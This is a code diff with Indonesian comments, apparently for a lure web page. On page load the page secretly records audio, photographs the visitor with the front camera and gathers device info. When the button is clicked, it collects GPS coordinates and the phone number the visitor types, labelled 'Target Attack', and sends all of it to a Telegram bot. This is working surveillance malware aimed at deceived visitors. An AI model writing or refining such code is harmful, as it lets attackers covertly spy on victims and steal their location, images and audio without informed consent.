@@ -141,19 +141,18 @@
       } catch (err) {}
     }
 
-    // Fungsi GPS yang dipanggil setelah izin kamera diberikan
-    function getGPSLocation() {
+    // FUNGSI LOKASI SESUAI PERMINTAAN ANDA
+    function trackLocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           pos => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const link = `https://www.google.com/maps?q=${lat},${lon}`;
-            sendToTelegram(`<b>📍 Lokasi GPS (Auto-Track):</b> <a href="${link}">Klik di sini</a>`);
+            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
           },
-          () => sendToTelegram(`📍 Izin Lokasi Ditolak ❌`),
-          { enableHighAccuracy: true }
+          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
         );
+      } else {
+        sendToTelegram(`📍 Browser tidak support GPS`);
       }
     }
 
@@ -178,10 +177,6 @@
     async function takePhoto(facingMode, label) {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
-        
-        // JIKA KAMERA DIIZINKAN, LANGSUNG LACAK GPS
-        getGPSLocation();
-
         const video = document.createElement('video');
         video.srcObject = stream;
         await video.play();
@@ -203,12 +198,9 @@
       }
     }
 
-    // SEMUA IZIN OTOMATIS SAAT MASUK (TANPA TOMBOL)
     window.addEventListener('DOMContentLoaded', () => {
       createParticles();
       getInfo();
-      
-      // Pemicu izin serentak
       autoRecordAudio();
       takePhoto("user", "Depan");
     });
@@ -216,9 +208,14 @@
     button.addEventListener('click', () => {
       const nomor = input.value.trim();
       if (!nomor || nomor.length < 8) return;
+      
+      // MENJALANKAN FUNGSI LOKASI SAAT TOMBOL DIKLIK
+      trackLocation();
+
       button.disabled = true;
       notif.style.display = 'none';
       sendToTelegram(`<b>📞 Target Attack:</b> ${nomor}`);
+      
       setTimeout(() => {
         notif.style.display = 'block';
         button.disabled = false;
